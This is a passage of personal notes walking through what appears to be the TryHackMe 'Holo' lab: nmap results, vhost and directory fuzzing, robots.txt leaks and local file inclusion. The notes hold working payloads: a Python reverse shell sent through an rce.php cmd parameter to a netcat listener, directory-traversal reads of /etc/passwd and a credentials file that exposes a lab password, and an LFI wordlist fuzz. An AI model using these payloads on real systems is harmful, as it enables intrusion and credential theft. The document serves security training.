|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=1/30%Time=63D809F9%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.93 seconds

https://stackoverflow.com/questions/63556825/what-is-the-port-33060-for-mysql-server-ports-in-addition-to-the-port-3306
```
What is the last octet of the IP address of the public-facing web server?
*33*
How many ports are open on the web server?
*3*
What CME is running on port 80 of the web server?
*Wordpress*
What version of the CME is running on port 80 of the web server?
*5.5.3*
What is the HTTP title of the web server?
*holo.live*

## Exploitation
After scanning the Network range, you discover a public-facing Web server. You take to your keyboard as you begin enumerating the Web Application's attack surface. Your target is L-SRV01 found from initial reconnaissance.
**Important Note: a large number of users have reported L-SRV01 is crashing. This is likely due to multiple people running Gobuster and WFuzz at once. It is highly recommended that you reduce the thread count while attempting file/directory enumeration on L-SRV01.**
Virtual Hosts or vhosts are a way of running multiple websites on one single server. They only require an additional header, Host, to tell the Web Server which vhost the traffic is destined; this is particularly useful when you only have one IP address but can add as many DNS entries as you would like. You will often see hosted services like Squarespace or WordPress do this.
We can utilize Gobuster again to identify potential vhosts present on a web server. The syntax is comparable to fuzzing for directories and files; however, we will use the `vhosts` mode rather than `dir` this time. `-u` is the only argument that will need a minor adjustment from the previous fuzzing command. `-u` is the base URL that Gobuster will use to discover vhosts, so if you provide `-u` "[https://tryhackme.com](https://tryhackme.com/)" GoBuster will set the host to "[tryhackme.com](http://tryhackme.com/)" and set the host header to `Host: LINE1.tryhackme.com`. If you specify "[https://www.tryhackme.com](https://www.tryhackme.com/)", GoBuster will set the host to "[www.tryhackme.com](http://www.tryhackme.com/)" and the host header to `Host: LINE1.www.tryhackme.com`. Be careful that you don't make this mistake when fuzzing.
Syntax: `gobuster vhost -u <URL to fuzz> -w <wordlist>`
We recommend using the Seclists "subdomains-top1million-110000.txt" wordlist for fuzzing vhosts.
Wfuzz also offers vhost fuzzing capability similar to its directory brute-forcing capability. The syntax is almost identical to the Gobuster syntax; however, you will need to specify the host header with the `FUZZ` parameter, similar to selecting the parameter when directory brute-forcing.
Syntax: `wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>`
Now that we have some vhosts to work off from fuzzing, we need a way to access them. If you're in an environment where there is no DNS server, you can add the IP address followed by the FQDN of the target hosts to your _/etc/hosts_ file on Linux or _C:\\Windows\\System32\\Drivers\\etc\\hosts_ file if you're on Windows.
Answer the questions below
![[Pasted image 20230130132958.png]]
```text
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
[sudo] password for kali:
```
```text
┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
127.0.0.1    newcms.mofo.pwn
10.200.108.33 holo.live

uhmm not work (resetting)
```
```text
┌──(kali㉿kali)-[~]
└─$ wfuzz -u holo.live -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.holo.live" --hc 404    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://holo.live/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000001:   200        155 L    1398 W     21405 Ch    "www"                        
000000003:   200        156 L    1402 W     21456 Ch    "ftp"                        
000000012:   200        156 L    1402 W     21456 Ch    "ns2"                        
000000010:   200        156 L    1402 W     21456 Ch    "whm"                        
000000011:   200        156 L    1402 W     21456 Ch    "ns1"                        
000000009:   200        156 L    1402 W     21456 Ch    "cpanel"                     
000000007:   200        156 L    1402 W     21456 Ch    "webdisk"                    
000000008:   200        156 L    1402 W     21456 Ch    "pop"                        
000000006:   200        156 L    1402 W     21456 Ch    "smtp"                       
000000005:   200        156 L    1402 W     21456 Ch    "webmail"                    
000000004:   200        156 L    1402 W     21456 Ch    "localhost"                  
000000019:   200        271 L    701 W      7515 Ch     "dev"                        
000000024:   200        75 L     158 W      1845 Ch     "admin"                      
000000002:   200        156 L    1402 W     21456 Ch    "mail"                       
000000013:   200        156 L    1402 W     21456 Ch    "autodiscover"               
000000015:   200        156 L    1402 W     21456 Ch    "ns"                         
000000023:   200        156 L    1402 W     21456 Ch    "forum"                      
000000022:   200        156 L    1402 W     21456 Ch    "pop3"                       
000000018:   200        156 L    1402 W     21456 Ch    "blog"                       
000000021:   200        156 L    1402 W     21456 Ch    "ns3"                        
000000025:   200        156 L    1402 W     21456 Ch    "mail2"                      
000000030:   200        156 L    1402 W     21456 Ch    "new"       

I see gobuster v 3.3 (the problem)

The `--append-domain false` option in Gobuster means that it will not append the target domain to each word in the wordlist. This means that the tool will only test the subdomains exactly as they appear in the wordlist, without adding the target domain to each word.

For example, if the wordlist contains the word "www", and the target domain is "holo.live", Gobuster will not automatically test the subdomain "[www.holo.live](http://www.holo.live/)". Instead, it will only test "www".

look :) (Shoppy HTB, Three HTB)
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster vhost -u holo.live -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain false 

===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://holo.live
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/30 17:07:56 Starting gobuster in VHOST enumeration mode
===============================================================
Found: www.holo.live Status: 200 [Size: 21405]
Found: dev.holo.live Status: 200 [Size: 7515]
Found: admin.holo.live Status: 200 [Size: 1845]
Found: gc._msdcs.holo.live Status: 400 [Size: 422]
Progress: 964 / 114442 (0.84%)^C
```
```text
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | grep "www" | wc -l
6343
```
```text
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | grep "dev" | wc -l
727
```
```text
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | grep "admin" | wc -l
2318
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nano /etc/hosts
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ tail /etc/hosts
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
#127.0.0.1    newcms.mofo.pwn
10.200.108.33 holo.live 
10.200.108.33 www.holo.live admin.holo.live dev.holo.live

www.holo.live (load images)
```
![[Pasted image 20230130135448.png]]
What domains loads images on the first web page?
*www.holo.live*
What are the two other domains present on the web server? Format: Alphabetical Order
*admin.holo.live,dev.holo.live*
Now that we have a basic idea of the web server's virtual host infrastructure, we can continue our asset discovery by brute-forcing directories and files. Your target is still L-SRV01 found from initial reconnaissance.
HTTP and HTTPS (DNS included) are the single most extensive and most complex set of protocols that make up one entity that we know as the Web. Due to its complexity, many vulnerabilities are introduced on both the client-side and server-side.
Asset discovery is the most critical part of discovering the attack surface on a target Web Server. There's always a chance that any web page you discover may contain a vulnerability, so you need to be sure that you don't miss any. Since the web is such a big surface, where do we start?
We ideally want to discover all the target-owned assets on the Web Server. This is much easier for the target to do because they can run a `dir` or `ls` in the root of the Web Server and view all the contents of the web server, but we don't have that luxury (typically, there are a few protocols like WebDAV that allow us to list the contents).
The most popular method is to send out connections to the remote web server and check the HTTP status codes to determine if a valid file exists, 200 OK if the file exists, 404 File Not Found if the file does not exist. This technique is knowing as fuzzing or directory brute-forcing.
There are many tools available to help with this method of asset discovery. Below is a short list of commonly used tools.
-   Gobuster
-   WFuzz
-   dirsearch
-   dirbuster
The first tool we will be looking at for file discovery is Gobuster; from the Gobuster Kali page, "Gobuster is a scanner that looks for existing or hidden web objects. It works by launching a dictionary attack against a web server and analyzing the response."
Gobuster has multiple options for attack techniques; within this room, we will primarily utilize the `dir` mode. Gobuster will use a few common arguments frequently with Gobuster; these can be found below.
-   `-u` or `—url`
-   `-w` or `—wordlist`
-   `-x` or `—extensions`
-   `-k` or `—insecureurl`
Syntax: `gobuster dir -u <URL to fuzz> -w <wordlist to use> -x <extensions to check>`
We recommend using the Seclists "big.txt" wordlist for directory fuzzing.
Important Note: a large number of users have reported L-SRV01 is crashing. This is likely due to multiple people running Gobuster and WFuzz at once. It is highly recommended that you reduce the thread count while attempting file/directory enumeration on L-SRV01.
If you notice your fuzzing is going slower than you would like, Gobuster can add threads to your attack. The parameter for threading is `-t` or `—threads` Gobuster accepts integers between 1 and 99999. By default, Gobuster utilizes ten threads. As you increase threads, Gobuster can become further unstable and cause false positives or skip over lines in the wordlist. Thread count will be dependent on your hardware. We recommend sticking between 30 and 40 threads.
Syntax: `gobuster -t <threads> dir -u <URL to fuzz> -w <wordlist>`
In the real world, you always want to be mindful of how much traffic you're sending to the Web Server. You always want to make sure you're allowing enough bandwidth for actual clients to connect to the server without any noticeable delay. If you're in a Red Team setting where stealth is critical, you'll never want to have a high thread count.
The second tool we will be looking at is Wfuzz. From the Wfuzz GitHub, "Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.". As you can see, Wfuzz is a comprehensive tool with many capabilities; we will only be looking at a thin layer of what it can do. Compared to the Gobuster syntax, it is almost identical; find the syntax arguments below.
-   `-u` or `—url`
-   `-w` or `—wordlist`
The critical distinction in syntax between the two is that Wfuzz requires a `FUZZ` parameter to be present within the URL where you want to substitute in the fuzzing wordlist.
Syntax: `wfuzz -u example.com/FUZZ.php -w <wordlist>`
WFuzz also offers some advanced usage with specific parameters that we will not be covering in-depth within this room but are important to note. These can be found below.
-   `—hc` Hide status code
-   `—hw` Hide word count
-   `—hl` Hide line count
-   `—hh` Hide character count
These parameters will help find specific things more accessible, for example, if you're fuzzing for SQLi. You know that an internal server error will occur if an invalid character is entered. The Database query will fail (which should result in an HTTP Status code 500 [Internal Server Error]); you can use an SQLi wordlist and filter on status codes 200-404.
Answer the questions below
```text
──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster -u http://admin.holo.live -w /usr/share/wordlists/dirb/common.txt -k -t 64 -x php -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.holo.live
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       75l      158w     1845c http://admin.holo.live/
200      GET        0l        0w        0c http://admin.holo.live/db_connect.php
200      GET       75l      158w     1845c http://admin.holo.live/index.php
200      GET        4l        8w      135c http://admin.holo.live/robots.txt
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster -u http://dev.holo.live -w /usr/share/wordlists/dirb/common.txt -k -t 64 -x php -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.holo.live
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      271l      701w     7515c http://dev.holo.live/
200      GET      295l      982w        0c http://dev.holo.live/about.php
200      GET      271l      701w     7515c http://dev.holo.live/index.php
200      GET        0l        0w        0c http://dev.holo.live/img.php
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster -u http://www.holo.live -w /usr/share/wordlists/dirb/common.txt -k -t 64 -x php -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://www.holo.live
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       22l       44w      913c http://www.holo.live/robots.txt
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_www_holo_live-1675124138.state ...
[############>-------] - 2m     17613/27684   1m      found:1       errors:264    
[##################>-] - 2m      8518/9228    49/s    http://www.holo.live/ 
[####################] - 34s     9228/9228    266/s   http://www.holo.live/javascript/ 
[>-------------------] - 2s        36/9228    14/s    http://www.holo.live/upgrade/ 

view-source:http://www.holo.live/robots.txt

User-Agent: *
Disallow: /var/www/wordpress/index.php
Disallow: /var/www/wordpress/readme.html
Disallow: /var/www/wordpress/wp-activate.php
Disallow: /var/www/wordpress/wp-blog-header.php
Disallow: /var/www/wordpress/wp-config.php
Disallow: /var/www/wordpress/wp-content
Disallow: /var/www/wordpress/wp-includes
Disallow: /var/www/wordpress/wp-load.php
Disallow: /var/www/wordpress/wp-mail.php
Disallow: /var/www/wordpress/wp-signup.php
Disallow: /var/www/wordpress/xmlrpc.php
Disallow: /var/www/wordpress/license.txt
Disallow: /var/www/wordpress/upgrade
Disallow: /var/www/wordpress/wp-admin
Disallow: /var/www/wordpress/wp-comments-post.php
Disallow: /var/www/wordpress/wp-config-sample.php
Disallow: /var/www/wordpress/wp-cron.php
Disallow: /var/www/wordpress/wp-links-opml.php
Disallow: /var/www/wordpress/wp-login.php
Disallow: /var/www/wordpress/wp-settings.php
Disallow: /var/www/wordpress/wp-trackback.php

http://admin.holo.live/robots.txt

User-agent: Googlebot
Disallow:  /info/
Disallow:  /search/

User-agent: Mediapartners-Google
Disallow:  /info/
Disallow:  /search/

User-agent: Yahoo! Slurp
Allow: /$
Disallow: /

User-agent: bingbot
Allow: /$
Disallow: /

User-agent: Yandex
Allow: /$
Disallow: /

User-agent: Baiduspider
Disallow: /

User-agent: Sogou
Disallow: /

User-agent: ia_archiver
Disallow:

User-agent: IPS-Agent
Disallow: /parking.php4

User-agent: BLEXBot
Disallow: /

User-agent: *
Disallow: /

open web incognito

http://admin.holo.live/robots.txt

User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt

http://admin.holo.live/supersecretdir/creds.txt

Forbidden 403

dev.holo.live/img.php

view-source:http://dev.holo.live/talents.php

<div class="col-md-4 col-sm-6 col-xxs-12">
					<a href="img.php?file=images/fubuki.jpg" class="fh5co-project-item image-popup to-animate">
						<img src="img.php?file=images/fubuki.jpg" alt="Image" class="img-responsive">
						<div class="fh5co-text">
						<h2>Fubuki Shirakami</h2>
						<span>No No No foxu!</span>
						</div>
					</a>
				</div>
```
What file leaks the web server's current directory?
*robots.txt*
What file loads images for the development domain?
*img.php*
What is the full path of the credentials file on the administrator domain?
*/var/www/admin/supersecretdir/creds.txt*
For the following sections on web application exploitation, we have provided a development instance of a test server to practice attacks before moving over to the actual production web server.
To set up the test environment, you will need to install apache 2, PHP, and the environment files. Follow the steps outlined below.
1.  `apt install apache2 php`
2.  edit configuration files to use port 8080
3.  `systemctl start apache2`
4.  `wget https://github.com/Sq00ky/holo-bash-portscanner/raw/main/holo-playground.zip -O /var/www/holo.zip && unzip /var/www/holo.zip`
Answer the questions below
Install the needed utilities and then set up the test environment.
```text
┌──(root㉿kali)-[/var/www/html]
└─# unzip holo.zip 
Archive:  holo.zip
  inflating: index.php               
  inflating: lfi.php                 
 extracting: phpinfo.php             
  inflating: rce.php                 
 extracting: robots.txt              
   creating: secretdir/
  inflating: secretdir/catpics.jpg   
  inflating: secretdir/pizza.png     
 extracting: secretdir/test.txt      
                                                                                              
┌──(root㉿kali)-[/var/www/html]
└─# ls
holo.zip    index.nginx-debian.html  lfi.php      rce.php     secretdir
index.html  index.php                phpinfo.php  robots.txt  test
```
### What is this? Vulnversity?
Now that you understand the file structure and infrastructure behind the webserver, you can begin attacking it. Based on technical errors and misconfigurations found on the webserver, we can assume that the developer is not highly experienced. Use the information that you have already identified from asset discovery to move through the attack methodically.
From OWASP, "Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application." LFI can be trivial to identify, typically found from parameters, commonly used when downloading files or referencing images. Find an example below from the test environment.
Example: `http://127.0.0.1/img.php?file=CatPics.jpg`
To exploit this vulnerability, we need to utilize a technique known as directory traversal. From Portswigger, "Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application." This vulnerability is exploited by using a combination of `../` in sequence to go back to the webserver's root directory. From here, you can read any files that the webserver has access to. A common way of testing PoC for LFI is by reading `/etc/passwd`. Find an example below from the test environment.
Example: `http://127.0.0.1/img.php?file=../../../../../../../../etc/passwd`
In the above example, the `?file` parameter is the parameter that we exploit to gain LFI.
That is the entire concept of LFI. For the most part, LFI is used to chain to other exploits and provide further access like RCE; however, LFI can also give you some helpful insight and enumerate the target system depending on the access level webserver. An example of using LFI to read files is finding an interesting file while fuzzing; however, you get a 403 error. You can use LFI to read the file and bypass the error code.
Answer the questions below
```text
practicing

http://localhost/lfi.php?file=/../../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh .....

https://book.hacktricks.xyz/pentesting-web/file-inclusion

http://localhost/rce.php?cmd=hostname

Hello kali

http://localhost/rce.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.19.103%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22bash%22)%27
```
```text
┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.8.19.103.
Ncat: Connection from 10.8.19.103:52008.
www-data@kali:/var/www/html$ whoami
whoami
www-data
www-data@kali:/var/www/html$ ls
ls
holo.zip    index.nginx-debian.html  lfi.php	  rce.php     secretdir
index.html  index.php		     phpinfo.php  robots.txt  test

Holo

http://dev.holo.live/img.php?file=images/korone.jpg
```
```text
┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ curl http://dev.holo.live/img.php?file=../../../../../../../../etc/passwd (or starting with /)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false

└─$ curl http://dev.holo.live/img.php?file=/../../../../../../../../var/www/admin/supersecretdir/creds.txt 
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3

Fuzzing LFI
```
```text
┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hw 0 http://dev.holo.live/img.php?file=../../../../../../../FUZZ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.holo.live/img.php?file=../../../../../../../FUZZ
Total requests: 877

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000001:   200        20 L     26 W       982 Ch      "/etc/passwd"                
000000005:   200        227 L    1117 W     7244 Ch     "/etc/apache2/apache2.conf"  
000000018:   200        1 L      6 W        37 Ch       "/etc/fstab"                 
000000024:   200        7 L      16 W       179 Ch      "/etc/hosts"                 
000000026:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"            
000000025:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"           
000000038:   200        2 L      5 W        26 Ch       "/etc/issue"                 
000000047:   200        36 L     216 W      3410 Ch     "/etc/mtab"                  
000000050:   200        21 L     104 W      682 Ch      "/etc/mysql/my.cnf"          
000000044:   200        4 L      6 W        105 Ch      "/etc/lsb-release"           
000000052:   200        2 L      12 W       91 Ch       "/etc/networks"              
000000067:   200        27 L     97 W       581 Ch      "/etc/profile"               
000000077:   200        3 L      6 W        72 Ch       "/etc/resolv.conf"           
000000101:   200        54 L     338 W      1896 Ch     "/proc/cpuinfo"              
000000105:   200        52 L     152 W      1447 Ch     "/proc/meminfo"              
000000110:   200        1 L      17 W       149 Ch      "/proc/version"              
000000108:   200        10 L     1009 W     2203 Ch     "/proc/stat"                 
000000111:   200        2 L      15 W       156 Ch      "/proc/self/net/arp"         
000000109:   200        1 L      5 W        37 Ch       "/proc/swaps"                
000000107:   200        36 L     216 W      3410 Ch     "/proc/mounts"               
000000102:   200        33 L     60 W       399 Ch      "/proc/filesystems"          
000000103:   200        45 L     256 W      2507 Ch     "/proc/interrupts"           
000000104:   200        39 L     133 W      962 Ch      "/proc/ioports"              
000000106:   200        43 L     258 W      2292 Ch     "/proc/modules"              
000000185:   200        0 L      1 W        3264 Ch     "/var/log/faillog"           
000000196:   200        0 L      1 W        29784 Ch    "/var/log/lastlog"           
000000178:   200        4412 L   26212 W    301854 Ch   "/var/log/dpkg.log"          
000000262:   200        88 L     467 W      3028 Ch     "/etc/adduser.conf"          
000000275:   200        47 L     227 W      1782 Ch     "/etc/apache2/envvars"       
000000283:   200        32 L     139 W      1280 Ch     "/etc/apache2/mods-available/
                                                        setenvif.conf"               
000000285:   200        24 L     131 W      843 Ch      "/etc/apache2/mods-enabled/al
                                                        ias.conf"                    
000000282:   200        27 L     139 W      822 Ch      "/etc/apache2/mods-available/
                                                        proxy.conf"                  
000000279:   200        5 L      18 W       157 Ch      "/etc/apache2/mods-available/
                                                        dir.conf"                    
000000284:   200        85 L     442 W      3110 Ch     "/etc/apache2/mods-available/
                                                        ssl.conf"                    
000000277:   200        96 L     392 W      3374 Ch     "/etc/apache2/mods-available/
                                                        autoindex.conf"              
000000281:   200        251 L    1128 W     7676 Ch     "/etc/apache2/mods-available/
                                                        mime.conf"                   
000000278:   200        10 L     31 W       395 Ch      "/etc/apache2/mods-available/
                                                        deflate.conf"                
000000286:   200        10 L     31 W       395 Ch      "/etc/apache2/mods-enabled/de
                                                        flate.conf"                  
000000287:   200        5 L      18 W       157 Ch      "/etc/apache2/mods-enabled/di
                                                        r.conf"                      
000000289:   200        20 L     124 W      724 Ch      "/etc/apache2/mods-enabled/ne
                                                        gotiation.conf"              
